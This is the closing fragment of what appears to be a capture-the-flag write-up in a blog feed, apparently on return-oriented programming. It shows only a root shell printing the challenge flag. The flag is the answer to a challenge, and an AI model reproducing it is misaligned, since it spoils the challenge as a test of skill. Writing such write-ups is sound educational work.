    # cat flag
    flag{to_rop_or_not_to_rop}
</code></pre>
]]></content>
  </entry>
  
</feed>
